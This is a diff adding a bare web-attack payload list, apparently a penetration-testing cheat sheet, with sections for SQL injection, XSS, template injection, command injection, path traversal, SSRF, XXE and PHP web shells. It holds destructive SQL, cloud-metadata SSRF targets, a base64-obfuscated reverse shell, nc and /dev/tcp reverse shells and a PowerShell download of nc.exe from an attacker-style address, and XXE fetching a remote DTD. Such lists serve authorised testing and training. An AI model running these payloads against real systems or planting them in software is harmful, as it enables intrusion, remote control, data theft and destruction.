@@ -1,0 +1,254 @@
+sql
+' OR '1'='1' --
+admin' --
+' or 1=1--
+' or 1=1 limit 1--
+' or 1=1 /*
+' or 1=1; --
+" or 1=1--
+'or'1'='1
+'admin' or '1'='1'--
+' UNION SELECT NULL, NULL, NULL-- -
+' UNION SELECT NULL, NULL, NULL, NULL-- -
+' UNION SELECT 1,2,3,4,5-- -
+' UNION SELECT username, password FROM users-- -
+' UNION SELECT @@version, NULL, NULL-- -
+' UNION SELECT table_name, NULL FROM information_schema.tables-- -
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
+' ORDER BY 1-- -
+' ORDER BY 10-- -
+' ORDER BY 100-- -
+' AND SLEEP(5)-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+' WAITFOR DELAY '00:00:05'-- -
+' OR SLEEP(5)=0-- -
+' AND 1=CONVERT(int, @@version)-- -
+' AND 1=CAST((SELECT @@version) AS int)-- -
+' AND ExtractValue(0, CONCAT(0x0a, @@version))-- -
+' AND (SELECT 1/0)-- -
+' AND GTID_SUBSET(@@version,0)-- -
+'; DROP TABLE users-- -
+'; INSERT INTO users (username, password) VALUES ('hacker', 'password')-- -
+'; UPDATE users SET password='hacked' WHERE username='admin'-- -
+'; DELETE FROM users WHERE username='admin'-- -
+'; EXEC xp_cmdshell('whoami')-- -
+1' AND 1=1-- -
+1' AND 1=2-- -
+1'/*
+1'#
+1'-- -
+1' ;-- -
+' OR username like '%
+'||'1'='1'-- -
+' AND LENGTH(@@version)>0-- -
+' AND @@SERVERNAME-- -
+' AND (SELECT banner FROM v$version WHERE rownum=1)-- -
+' AND version()-- -
+' AND current_database()-- -
+
+XSS
+
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)">
+<math href="javascript:alert(1)">click</math>
+<svg><script>alert(1)</script>
+<isindex action="javascript:alert(1)" type=image>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+'"><script>alert(1)</script>
+"><script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert(1)</script>
+';alert(0)//
+\';alert(1)//
+";alert(2)//
+\";alert(3)//
+--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<svg onload=alert&#40;1&#41;>
+<svg onload=alert(1)//
+<svg/onload=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<image src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<details open ontoggle=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadedmetadata=alert(1)>
+<marquee onstart=alert(1)>
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set onbegin=alert(1) attributeName=x>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:msgbox(1)
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+
+SSTI
+
+# Detection payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{7*7}
+{{7*'7'}}
+{{7*7}}${7*7}<%= 7*7 %>{7*7}
+
+# Information disclosure
+{{config}}
+${T(java.lang.System).getenv()}
+<%= ENV %>
+{$smarty.server}
+#{process.env}
+{{self.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# File read
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
+<%= File.read('/etc/passwd') %>
+{php}echo file_get_contents('/etc/passwd');{/php}
+{{config.items()}}
+{{lipsum.__globals__}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+
+# Remote Code Execution (RCE)
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{lipsum.__globals__['os'].popen('ls -la').read()}}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].strip()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<%= system('id') %>
+{php}system('id');{/php}
+${"freemarker.template.utility.Execute"?new()("id")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
+#{process.mainModule.require('child_process').execSync('id').toString()}
+
+# Jinja2 specific
+{{lipsum.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
+{{''['\x5f\x5fclass\x5f\x5f']}}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
+
+Command Injection
+
+# Unix/Linux
+; ls
+; whoami
+| ls
+| whoami
+|| ls
+|| whoami
+& ls
+& whoami
+&& ls
+&& whoami
+`ls`
+`whoami`
+$(ls)
+$(whoami)
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+`ls -la`
+$(ls -la)
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; nc -e /bin/sh 10.10.14.25 4444
+| nc -e /bin/sh 10.10.14.25 4444
+; bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
+| bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
+
+# Windows
+& dir
+| dir
+& whoami
+| whoami
+& ipconfig
+| ipconfig
+& type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+& powershell -c "Invoke-WebRequest http://10.10.14.25/nc.exe -OutFile C:\Windows\Temp\nc.exe"
+| powershell -c "Invoke-WebRequest http://10.10.14.25/nc.exe -OutFile C:\Windows\Temp\nc.exe"
+
+LFI
+
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+..;/etc/passwd
+....//....//....//etc/passwd
+..\..\..\..\..\..\..\..\..\etc\passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%25%32%65%25%32%65%25%32%66etc%25%32%66passwd
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+
+SSRF
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://localhost/
+http://localhost:80/
+http://0.0.0.0/
+http://[::1]/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/
+http://100.100.100.200/latest/meta-data/
+http://192.168.1.1/
+file:///etc/passwd
+gopher://localhost:8080/_GET / HTTP/1.0
+dict://localhost:11211/
+
+XXE
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://10.10.14.25/xxe.dtd'>%remote;]><root/>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://10.10.14.25/xxe.dtd">%dtd;]><root/>
+
+php Code injection
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_POST['cmd']); ?>
+<?php eval($_REQUEST['cmd']); ?>
+<?php passthru('id'); ?>
+<?php exec('whoami'); ?>
+
+
+Catch all payloads
+
+{{7*7}}${7*7}<%= 7*7 %>{7*7}
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>
+'"`<script>alert(1)</script>
+{{config}}${_self}<%= self %>{$smarty}
+<img/src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
